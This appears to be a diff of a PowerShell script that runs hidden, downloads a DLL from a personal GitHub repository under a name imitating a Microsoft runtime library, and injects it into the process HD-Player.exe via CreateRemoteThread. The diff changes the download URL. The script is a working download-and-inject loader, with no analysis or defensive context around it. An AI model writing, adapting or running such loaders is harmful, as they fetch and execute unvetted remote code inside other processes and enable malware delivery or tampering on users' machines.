@@ -2,7 +2,7 @@
 powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c your_command_here' -WindowStyle Hidden"
 
 # URL of the DLL to download
-$dllUrl = "https://github.com/prantikba03-gif/ngcgfx/raw/refs/heads/main/Msvcp.dll"
+$dllUrl = "https://github.com/prantikba03-gif/ps-code/raw/refs/heads/main/msvcp.dll"
 # Local path to save the DLL
 $dllPath = "C:\Program Files (x86)\Msvcp.dll"
 
@@ -67,5 +67,6 @@ $loadLibraryAddr = [Win32.NativeMethods]::GetProcAddress(
 
 # Create remote thread to load DLL
 [void][Win32.NativeMethods]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [IntPtr]::Zero)
+
 
 Write-Host "DLL injected into HD-Player.exe"
